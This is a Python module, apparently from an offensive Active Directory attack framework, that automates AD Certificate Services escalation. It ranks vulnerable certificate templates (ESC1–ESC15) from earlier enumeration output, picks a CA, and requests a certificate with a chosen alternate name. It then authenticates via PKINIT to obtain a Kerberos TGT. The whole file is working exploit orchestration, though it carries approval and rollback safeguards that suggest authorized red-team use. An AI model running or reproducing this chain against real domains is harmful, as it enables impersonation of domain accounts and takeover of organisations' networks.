"""ESC1-ESC15 automated exploit chain.

Reads a prior adcs-enum / adcs-policy-probe session output, ranks templates by
ESC severity + confidence, then invokes cert-request → pkinit-auth.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from rich.console import Console

from adaf_attack.core.confidence import score_chain
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import (
    ApprovalPolicy,
    RiskLevel,
    RollbackClass,
    SafetyProfile,
    register_capability,
)
from adaf_attack.core.rollback import record_pre_state
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

# Lower index = higher priority for automated chain selection
ESC_PRIORITY = (
    "ESC1",
    "ESC6",
    "ESC9",
    "ESC2",
    "ESC3",
    "ESC4",
    "ESC8",
    "ESC7",
    "ESC10",
    "ESC11",
    "ESC13",
    "ESC14",
    "ESC15",
)

CONFIDENCE_BONUS = {"high": 0, "medium": 1, "low": 2, "unknown": 3}


def _signals_from_template(tpl: dict[str, Any]) -> list[str]:
    signals: list[str] = []
    for key in (
        "esc_tags",
        "esc_signals",
        "esc",
    ):
        raw = tpl.get(key) or []
        if isinstance(raw, list):
            signals.extend(str(x) for x in raw)
    for flag, label in (
        ("esc1_candidate", "ESC1"),
        ("esc2_candidate", "ESC2"),
        ("esc3_agent_template", "ESC3"),
        ("esc9_candidate", "ESC9"),
    ):
        if tpl.get(flag):
            signals.append(label)
    # Normalize ESC3_AGENT → ESC3
    normalized = []
    for s in signals:
        if s.startswith("ESC3"):
            normalized.append("ESC3")
        else:
            normalized.append(s)
    return sorted(set(normalized))


def _pick_template(adcs_json: dict[str, Any]) -> dict[str, Any] | None:
    templates = adcs_json.get("templates", []) or adcs_json.get("vulnerable_templates", [])
    if not templates:
        return None

    scored: list[tuple[tuple[int, int, int], dict[str, Any]]] = []
    for tpl in templates:
        signals = _signals_from_template(tpl)
        if not signals:
            continue
        priority = min(
            (ESC_PRIORITY.index(sig) for sig in signals if sig in ESC_PRIORITY),
            default=99,
        )
        conf = str(tpl.get("highest_confidence") or tpl.get("confidence") or "medium")
        enroll = int(tpl.get("enroll_principal_count") or 0)
        # rank tuple: lower is better
        rank = (priority, CONFIDENCE_BONUS.get(conf, 3), 0 if enroll else 1)
        scored.append((rank, tpl))

    if not scored:
        return None
    scored.sort(key=lambda x: x[0])
    return scored[0][1]


@register_capability(
    id="esc-chain",
    summary="Automated ESC1-ESC15 exploit chain: template -> cert -> PKINIT -> TGT",
    category="privilege-escalation",
    tags=("adcs", "esc1", "esc2", "esc3", "esc6", "esc8", "esc9", "chain"),
    safety=SafetyProfile(
        risk=RiskLevel.DESTRUCTIVE,
        approval=ApprovalPolicy.FORCE_AND_ACK,
        rollback=RollbackClass.MANUAL,
        network_side_effect=True,
        modifies_directory=True,
        exposes_credentials=True,
    ),
)
class EscChain:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        adcs_session = kwargs.get("adcs_session")
        template = kwargs.get("template")
        ca = kwargs.get("ca")
        alt_name = kwargs.get("alt_name") or target.username
        sam = kwargs.get("sam") or target.username

        picked_meta: dict[str, Any] = {}
        if not template or not ca:
            if not adcs_session:
                raise RuntimeError(
                    "Provide -P template=<name> -P ca=<name> OR -P adcs_session=<prior-session-dir>."
                )
            adcs_path = Path(str(adcs_session)).expanduser() / "adcs-enum.json"
            if not adcs_path.is_file():
                raise RuntimeError(f"adcs-enum.json not found: {adcs_path}")
            adcs_json = json.loads(adcs_path.read_text(encoding="utf-8"))
            picked = _pick_template(adcs_json)
            if not picked:
                raise RuntimeError("No exploitable ESC template found in prior adcs-enum output.")
            template = template or picked.get("cn") or picked.get("name") or picked.get("template")
            # Prefer first CA that publishes the template when possible
            if not ca:
                for ca_entry in adcs_json.get("cas") or []:
                    published = ca_entry.get("templates") or []
                    if template in published or not published:
                        ca = ca_entry.get("cn")
                        break
                ca = ca or (adcs_json.get("cas") or [{}])[0].get("cn")
            picked_meta = {
                "signals": _signals_from_template(picked),
                "confidence": picked.get("highest_confidence") or picked.get("confidence"),
                "enroll_principals": picked.get("enroll_principal_count"),
            }

        if not template or not ca:
            raise RuntimeError("Could not determine template + CA; specify both explicitly.")

        console.print(f"[bold]ESC chain[/bold] template={template} ca={ca} alt={alt_name}")
        if picked_meta:
            console.print(
                f"  selected signals={picked_meta.get('signals')}  "
                f"confidence={picked_meta.get('confidence')}"
            )

        from adaf_attack.capabilities.cert_request import CertRequest
        from adaf_attack.capabilities.pkinit_auth import PkinitAuth

        cert_result = CertRequest().run(
            target,
            session,
            graph,
            include_secrets=include_secrets,
            force=force,
            template=template,
            ca=ca,
            alt_name=alt_name,
        )
        # The nested certificate runner records its own pre-state when
        # possible; retain a chain-level advisory so the operator sees that
        # CA-issued material and PKINIT artifacts may require manual cleanup.
        record_pre_state(
            session,
            kind="certificate-enroll",
            target=f"{ca}/{template}",
            extra={"advisory": True, "operation": "esc-chain"},
        )
        pfx = cert_result.get("pfx") or cert_result.get("pfx_path")

        pkinit_result: dict[str, Any] = {}
        if pfx and sam:
            pkinit_result = PkinitAuth().run(
                target,
                session,
                graph,
                include_secrets=include_secrets,
                force=force,
                sam=sam,
                pfx=pfx,
            )

        conf = score_chain(
            terminal_relation=(picked_meta.get("signals") or ["ESC1"])[0],
            path_length=2 if pkinit_result else 1,
            edge_kinds=list(picked_meta.get("signals") or []),
        )

        result = {
            "template": template,
            "ca": ca,
            "alt_name": alt_name,
            "sam": sam,
            "picked": picked_meta,
            "confidence": conf,
            "cert_request": cert_result,
            "pkinit_auth": pkinit_result,
        }
        out = session.path("esc-chain.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log("esc-chain.complete", template=template, ca=ca, confidence=conf["confidence"])
        console.print(
            f"[green]Done[/green]  template={template} → cert={bool(pfx)} → "
            f"tgt={bool(pkinit_result)}  confidence={conf['confidence']}"
        )
        return result
